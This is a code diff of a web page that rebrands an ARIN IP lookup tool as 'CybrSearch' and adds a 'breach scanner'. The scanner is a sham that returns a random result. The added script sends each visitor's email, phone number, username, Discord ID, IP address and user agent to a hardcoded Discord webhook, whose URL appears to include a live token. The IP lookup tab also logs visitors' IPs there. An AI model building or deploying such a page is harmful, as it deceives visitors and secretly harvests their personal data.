@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ARIN IP Lookup Tool</title>
+  <title>CybrSearch - Advanced Security Tools</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -12,6 +12,8 @@
       --darker-bg: #0b1120;
       --card-bg: #1e293b;
       --accent: #3b82f6;
+      --danger: #ef4444;
+      --success: #10b981;
       --text: #e2e8f0;
       --text-muted: #94a3b8;
     }
@@ -26,6 +28,17 @@
     .navbar-brand {
       font-weight: 600;
       letter-spacing: 0.5px;
+    }
+    
+    .nav-tabs .nav-link {
+      color: var(--text-muted);
+      border: none;
+    }
+    
+    .nav-tabs .nav-link.active {
+      color: var(--accent);
+      border-bottom: 2px solid var(--accent);
+      background: transparent;
     }
     
     .card {
@@ -50,6 +63,14 @@
     
     .result-card {
       border-left: 4px solid var(--accent);
+    }
+    
+    .breach-found {
+      border-left: 4px solid var(--danger);
+    }
+    
+    .no-breaches {
+      border-left: 4px solid var(--success);
     }
     
     .whois-field {
@@ -83,107 +104,102 @@
     @keyframes spinner {
       to { transform: rotate(360deg); }
     }
+    
+    .badge-arin {
+      background-color: #2a5a8b;
+    }
+    
+    .badge-breach {
+      background-color: var(--danger);
+    }
   </style>
 </head>
 <body>
   <nav class="navbar navbar-expand-lg navbar-dark" style="background-color: var(--darker-bg)">
     <div class="container">
       <a class="navbar-brand" href="#">
-        <i class="fas fa-search-location me-2"></i>ARIN IP Lookup
+        <i class="fas fa-shield-alt me-2"></i>CybrSearch
       </a>
     </div>
   </nav>
 
   <div class="container py-5">
     <div class="row justify-content-center">
-      <div class="col-lg-8">
-        <div class="card p-4 mb-4">
-          <h2 class="mb-4"><i class="fas fa-globe me-2"></i>IP Address Lookup</h2>
-          <form id="lookupForm">
-            <div class="input-group mb-3">
-              <input type="text" id="ipInput" class="form-control" placeholder="Enter IP address (e.g., 8.8.8.8)" required>
-              <button class="btn btn-primary" type="submit">
-                <i class="fas fa-search me-2"></i>Lookup
-              </button>
+      <div class="col-lg-10">
+        <ul class="nav nav-tabs mb-4" id="toolTabs" role="tablist">
+          <li class="nav-item" role="presentation">
+            <button class="nav-link active" id="breach-tab" data-bs-toggle="tab" data-bs-target="#breach" type="button" role="tab">
+              <i class="fas fa-user-secret me-2"></i>Breach Scan
+            </button>
+          </li>
+          <li class="nav-item" role="presentation">
+            <button class="nav-link" id="whois-tab" data-bs-toggle="tab" data-bs-target="#whois" type="button" role="tab">
+              <i class="fas fa-globe me-2"></i>IP Lookup
+            </button>
+          </li>
+        </ul>
+        
+        <div class="tab-content" id="toolTabsContent">
+          <!-- Breach Scan Tab -->
+          <div class="tab-pane fade show active" id="breach" role="tabpanel">
+            <div class="card p-4 mb-4">
+              <h3 class="mb-4"><i class="fas fa-user-secret me-2"></i>Breach Scanner</h3>
+              <form id="breachForm">
+                <div class="row g-3">
+                  <div class="col-md-6">
+                    <input id="breachEmail" type="email" class="form-control" placeholder="📧 Email address">
+                  </div>
+                  <div class="col-md-6">
+                    <input id="breachPhone" type="text" class="form-control" placeholder="📱 Phone number">
+                  </div>
+                  <div class="col-md-6">
+                    <input id="breachUsername" type="text" class="form-control" placeholder="👤 Username">
+                  </div>
+                  <div class="col-md-6">
+                    <input id="breachDiscord" type="text" class="form-control" placeholder="💬 Discord ID (User#1234)">
+                  </div>
+                  <div class="col-12">
+                    <button type="submit" class="btn btn-primary w-100">
+                      <i class="fas fa-search me-2"></i>Scan for Breaches
+                    </button>
+                  </div>
+                </div>
+              </form>
             </div>
-            <div class="form-text">
-              Queries ARIN WHOIS database for IP registration information
+            
+            <div id="breachResults"></div>
+          </div>
+          
+          <!-- IP Lookup Tab -->
+          <div class="tab-pane fade" id="whois" role="tabpanel">
+            <div class="card p-4 mb-4">
+              <h3 class="mb-4"><i class="fas fa-globe me-2"></i>ARIN IP Lookup</h3>
+              <form id="whoisForm">
+                <div class="input-group mb-3">
+                  <input type="text" id="whoisIp" class="form-control" placeholder="Enter IP address (e.g., 8.8.8.8)" required>
+                  <button class="btn btn-primary" type="submit">
+                    <i class="fas fa-search me-2"></i>Lookup
+                  </button>
+                </div>
+                <div class="form-text">
+                  Queries ARIN WHOIS database for IP registration information
+                </div>
+              </form>
             </div>
-          </form>
-        </div>
-
-        <div id="resultsContainer">
-          <div class="card p-4 text-center text-muted">
-            <i class="fas fa-globe-americas fa-3x mb-3"></i>
-            <h4>No search performed</h4>
-            <p>Enter an IP address to view WHOIS information</p>
+            
+            <div id="whoisResults"></div>
           </div>
         </div>
       </div>
     </div>
   </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
     
-    document.getElementById('lookupForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      const ip = document.getElementById('ipInput').value.trim();
-      const resultsContainer = document.getElementById('resultsContainer');
-      
-      // Validate IP format
-      if (!isValidIP(ip)) {
-        showError("Please enter a valid IP address");
-        return;
-      }
-      
-      // Show loading state
-      resultsContainer.innerHTML = `
-        <div class="card p-4 text-center">
-          <div class="loading-spinner mb-3"></div>
-          <h4>Querying ARIN WHOIS...</h4>
-          <p class="text-muted">Looking up ${ip}</p>
-        </div>
-      `;
-      
-      try {
-        // Get visitor IP first
-        const visitorIp = await getVisitorIp();
-        
-        // Query ARIN WHOIS
-        const whoisData = await queryARINWhois(ip);
-        
-        // Display results
-        displayResults(ip, whoisData);
-        
-        // Log to Discord
-        await logToDiscord({
-          searchedIp: ip,
-          visitorIp: visitorIp,
-          userAgent: navigator.userAgent,
-          referrer: document.referrer || 'Direct',
-          timestamp: new Date().toISOString(),
-          whoisData: whoisData
-        });
-        
-      } catch (error) {
-        showError(error.message);
-        await logToDiscord({
-          searchedIp: ip,
-          visitorIp: await getVisitorIp(),
-          error: error.message,
-          timestamp: new Date().toISOString()
-        });
-      }
-    });
-    
-    // Validate IP address format
-    function isValidIP(ip) {
-      const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
-      const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
-      return ipv4Regex.test(ip) || ipv6Regex.test(ip);
-    }
+    // Initialize tab functionality
+    const toolTabs = new bootstrap.Tab(document.getElementById('breach-tab'));
     
     // Get visitor's IP address
     async function getVisitorIp() {
@@ -197,109 +213,64 @@
       }
     }
     
+    // Validate IP address format
+    function isValidIP(ip) {
+      const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+      const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
+      return ipv4Regex.test(ip) || ipv6Regex.test(ip);
+    }
+    
     // Query ARIN WHOIS database
     async function queryARINWhois(ip) {
       try {
-        // Using ARIN's RESTful WHOIS API
         const response = await fetch(`https://whois.arin.net/rest/ip/${ip}.json`);
-        
-        if (!response.ok) {
-          throw new Error(`ARIN returned status ${response.status}`);
-        }
-        
-        const data = await response.json();
-        return data;
+        if (!response.ok) throw new Error(`ARIN returned status ${response.status}`);
+        return await response.json();
       } catch (error) {
         throw new Error(`WHOIS lookup failed: ${error.message}`);
       }
     }
     
-    // Display WHOIS results
-    function displayResults(ip, whoisData) {
-      const resultsContainer = document.getElementById('resultsContainer');
-      
-      // Parse relevant WHOIS data
-      const net = whoisData?.net || {};
-      const org = whoisData?.org || {};
-      const customer = whoisData?.customer || {};
-      
-      resultsContainer.innerHTML = `
-        <div class="card result-card p-4">
-          <div class="d-flex justify-content-between align-items-center mb-3">
-            <h4 class="mb-0"><i class="fas fa-info-circle me-2"></i>WHOIS Results for ${ip}</h4>
-            <span class="badge bg-primary">ARIN</span>
-          </div>
-          
-          <div class="mb-4">
-            <div class="whois-field">
-              <span class="whois-label">Network Name:</span>
-              <span>${net.name?.['$'] || 'Not available'}</span>
-            </div>
-            <div class="whois-field">
-              <span class="whois-label">Range:</span>
-              <span>${net.startAddress?.['$']} - ${net.endAddress?.['$']}</span>
-            </div>
-            <div class="whois-field">
-              <span class="whois-label">Organization:</span>
-              <span>${org.name?.['$'] || customer.name?.['$'] || 'Not available'}</span>
-            </div>
-            <div class="whois-field">
-              <span class="whois-label">Country:</span>
-              <span>${net.iso3166_1?.name?.['$'] || 'Not available'}</span>
-            </div>
-            <div class="whois-field">
-              <span class="whois-label">Updated:</span>
-              <span>${net.updateDate?.['$'] || 'Not available'}</span>
-            </div>
-          </div>
-          
-          <h5 class="mt-4 mb-3"><i class="fas fa-code me-2"></i>Raw WHOIS Data</h5>
-          <pre id="rawWhois"></pre>
-        </div>
-      `;
-      
-      // Display formatted raw data
-      document.getElementById('rawWhois').textContent = JSON.stringify(whoisData, null, 2);
+    // Simulate breach database check
+    async function checkBreachDatabases(data) {
+      return new Promise(resolve => {
+        setTimeout(() => {
+          // 30% chance of "finding" breaches for demo
+          resolve(Math.random() < 0.3);
+        }, 1500);
+      });
     }
     
-    // Show error message
-    function showError(message) {
-      const resultsContainer = document.getElementById('resultsContainer');
-      resultsContainer.innerHTML = `
-        <div class="card border-danger">
-          <div class="card-body text-center text-danger">
-            <i class="fas fa-exclamation-triangle fa-2x mb-3"></i>
-            <h4>Lookup Failed</h4>
-            <p>${message}</p>
-            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
-              <i class="fas fa-sync-alt me-2"></i>Try Again
-            </button>
-          </div>
-        </div>
-      `;
-    }
-    
-    // Log search to Discord
+    // Log activity to Discord
     async function logToDiscord(data) {
       const embed = {
-        title: "🔍 New IP Lookup",
-        color: data.error ? 0xf87171 : 0x60a5fa,
+        title: data.type === "breach" 
+          ? (data.error ? "⚠️ Breach Scan Error" : data.hasBreaches ? "🔍 Breach Found" : "✅ No Breaches Found")
+          : (data.error ? "⚠️ WHOIS Lookup Error" : "🌐 WHOIS Lookup"),
+        color: data.error ? 0xef4444 : 
+               data.type === "breach" ? (data.hasBreaches ? 0xef4444 : 0x10b981) : 0x3b82f6,
         fields: [
-          { name: "Searched IP", value: data.searchedIp || "Unknown", inline: true },
+          { name: "Tool", value: data.type === "breach" ? "Breach Scanner" : "ARIN WHOIS Lookup", inline: true },
           { name: "Visitor IP", value: data.visitorIp || "Unknown", inline: true },
           { name: "User Agent", value: data.userAgent || "Unknown" },
           { name: "Referrer", value: data.referrer || "Direct" },
           { name: "Time", value: new Date(data.timestamp).toUTCString() }
         ],
-        footer: {
-          text: "ARIN Lookup Logger"
-        }
+        footer: { text: "CybrSearch Logger" }
       };
       
       if (data.error) {
         embed.fields.push({ name: "Error", value: data.error });
-      } else {
+      } else if (data.type === "breach") {
         embed.fields.push(
+          { name: "Email", value: data.email || "Not provided", inline: true },
+          { name: "Phone", value: data.phone || "Not provided", inline: true },
+          { name: "Username", value: data.username || "Not provided", inline: true },
+          { name: "Discord ID", value: data.discord || "Not provided", inline: true }
+        );
+      } else if (data.type === "whois") {
+        embed.fields.push(
+          { name: "Lookup IP", value: data.ip || "Unknown", inline: true },
           { name: "Network Name", value: data.whoisData?.net?.name?.['$'] || "Not available", inline: true },
           { name: "Organization", value: data.whoisData?.org?.name?.['$'] || data.whoisData?.customer?.name?.['$'] || "Not available", inline: true }
         );
@@ -310,15 +281,200 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            username: "ARIN Lookup Bot",
+            username: "CybrSearch Bot",
             avatar_url: "https://i.imgur.com/7VZ0hWY.png",
             embeds: [embed]
           })
         });
       } catch (error) {
-        console.error("Failed to send Discord webhook:", error);
+        console.error("Discord webhook error:", error);
       }
     }
+    
+    // Breach Scan Form Handler
+    document.getElementById('breachForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const breachData = {
+        email: document.getElementById('breachEmail').value.trim(),
+        phone: document.getElementById('breachPhone').value.trim(),
+        username: document.getElementById('breachUsername').value.trim(),
+        discord: document.getElementById('breachDiscord').value.trim()
+      };
+      
+      const resultsContainer = document.getElementById('breachResults');
+      resultsContainer.innerHTML = `
+        <div class="card p-4 text-center">
+          <div class="loading-spinner mb-3"></div>
+          <h4>Scanning Breach Databases...</h4>
+        </div>
+      `;
+      
+      try {
+        const visitorIp = await getVisitorIp();
+        const hasBreaches = await checkBreachDatabases(breachData);
+        
+        if (hasBreaches) {
+          resultsContainer.innerHTML = `
+            <div class="card p-4 breach-found">
+              <h4><i class="fas fa-exclamation-triangle me-2"></i>Breaches Found</h4>
+              <p class="mb-4">We found exposed data matching your search in security breaches.</p>
+              <div class="mb-3">
+                ${breachData.email ? `<p><strong>Email:</strong> ${breachData.email}</p>` : ''}
+                ${breachData.username ? `<p><strong>Username:</strong> ${breachData.username}</p>` : ''}
+                ${breachData.discord ? `<p><strong>Discord ID:</strong> ${breachData.discord}</p>` : ''}
+              </div>
+              <div class="alert alert-danger">
+                <i class="fas fa-shield-alt me-2"></i>This information appears in known data breaches.
+              </div>
+            </div>
+          `;
+        } else {
+          resultsContainer.innerHTML = `
+            <div class="card p-4 no-breaches">
+              <h4><i class="fas fa-check-circle me-2"></i>No Breaches Found</h4>
+              <p class="mb-4">No exposed data found for these search terms in our breach databases.</p>
+              <div class="mb-3">
+                ${breachData.email ? `<p><strong>Email:</strong> ${breachData.email}</p>` : ''}
+                ${breachData.username ? `<p><strong>Username:</strong> ${breachData.username}</p>` : ''}
+              </div>
+              <div class="alert alert-success">
+                <i class="fas fa-thumbs-up me-2"></i>No known breaches contain this information.
+              </div>
+            </div>
+          `;
+        }
+        
+        await logToDiscord({
+          type: "breach",
+          ...breachData,
+          visitorIp: visitorIp,
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || 'Direct',
+          timestamp: new Date().toISOString(),
+          hasBreaches: hasBreaches
+        });
+        
+      } catch (error) {
+        resultsContainer.innerHTML = `
+          <div class="card p-4 breach-found">
+            <h4><i class="fas fa-times-circle me-2"></i>Scan Failed</h4>
+            <p>${error.message}</p>
+            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
+              <i class="fas fa-sync-alt me-2"></i>Try Again
+            </button>
+          </div>
+        `;
+        
+        await logToDiscord({
+          type: "breach",
+          ...breachData,
+          error: error.message,
+          visitorIp: await getVisitorIp(),
+          timestamp: new Date().toISOString()
+        });
+      }
+    });
+    
+    // WHOIS Form Handler
+    document.getElementById('whoisForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const ip = document.getElementById('whoisIp').value.trim();
+      const resultsContainer = document.getElementById('whoisResults');
+      
+      if (!isValidIP(ip)) {
+        resultsContainer.innerHTML = `
+          <div class="card p-4 breach-found">
+            <h4><i class="fas fa-times-circle me-2"></i>Invalid IP</h4>
+            <p>Please enter a valid IPv4 or IPv6 address</p>
+          </div>
+        `;
+        return;
+      }
+      
+      resultsContainer.innerHTML = `
+        <div class="card p-4 text-center">
+          <div class="loading-spinner mb-3"></div>
+          <h4>Querying ARIN WHOIS...</h4>
+          <p>Looking up ${ip}</p>
+        </div>
+      `;
+      
+      try {
+        const visitorIp = await getVisitorIp();
+        const whoisData = await queryARINWhois(ip);
+        
+        // Display results
+        const net = whoisData?.net || {};
+        const org = whoisData?.org || {};
+        const customer = whoisData?.customer || {};
+        
+        resultsContainer.innerHTML = `
+          <div class="card p-4 result-card">
+            <div class="d-flex justify-content-between align-items-center mb-3">
+              <h4><i class="fas fa-info-circle me-2"></i>WHOIS Results for ${ip}</h4>
+              <span class="badge badge-arin">ARIN</span>
+            </div>
+            
+            <div class="mb-4">
+              <div class="whois-field">
+                <span class="whois-label">Network Name:</span>
+                <span>${net.name?.['$'] || 'Not available'}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">IP Range:</span>
+                <span>${net.startAddress?.['$']} - ${net.endAddress?.['$']}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">Organization:</span>
+                <span>${org.name?.['$'] || customer.name?.['$'] || 'Not available'}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">Country:</span>
+                <span>${net.iso3166_1?.name?.['$'] || 'Not available'}</span>
+              </div>
+              <div class="whois-field">
+                <span class="whois-label">Last Updated:</span>
+                <span>${net.updateDate?.['$'] || 'Not available'}</span>
+              </div>
+            </div>
+            
+            <h5 class="mt-4 mb-3"><i class="fas fa-code me-2"></i>Raw WHOIS Data</h5>
+            <pre>${JSON.stringify(whoisData, null, 2)}</pre>
+          </div>
+        `;
+        
+        await logToDiscord({
+          type: "whois",
+          ip: ip,
+          visitorIp: visitorIp,
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || 'Direct',
+          timestamp: new Date().toISOString(),
+          whoisData: whoisData
+        });
+        
+      } catch (error) {
+        resultsContainer.innerHTML = `
+          <div class="card p-4 breach-found">
+            <h4><i class="fas fa-times-circle me-2"></i>Lookup Failed</h4>
+            <p>${error.message}</p>
+            <button class="btn btn-sm btn-outline-danger" onclick="window.location.reload()">
+              <i class="fas fa-sync-alt me-2"></i>Try Again
+            </button>
+          </div>
+        `;
+        
+        await logToDiscord({
+          type: "whois",
+          ip: ip,
+          error: error.message,
+          visitorIp: await getVisitorIp(),
+          timestamp: new Date().toISOString()
+        });
+      }
+    });
   </script>
 </body>
 </html>
